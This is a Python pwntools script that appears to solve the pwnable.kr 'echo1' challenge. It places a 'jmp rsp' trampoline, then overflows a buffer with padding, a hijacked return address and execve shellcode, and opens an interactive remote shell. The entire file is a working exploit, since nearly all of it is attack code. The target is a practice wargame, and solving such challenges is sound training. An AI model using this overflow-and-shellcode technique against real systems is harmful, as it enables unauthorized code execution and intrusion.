from pwn import *

context.arch='amd64'

###Util
def echo1(data):
    r.sendlineafter('> ','1')
    r.sendline(data)

###Addr
buf = 0x6020a0

###Exploit
r = remote('pwnable.kr',9010)

relay = asm('''jmp rsp''')
r.sendlineafter(' : ',relay)

padding = b'a'*0x28
fake_rip = p64(buf)
shellcode = asm(shellcraft.sh())
payload = padding+fake_rip+shellcode
echo1(payload)

r.interactive()

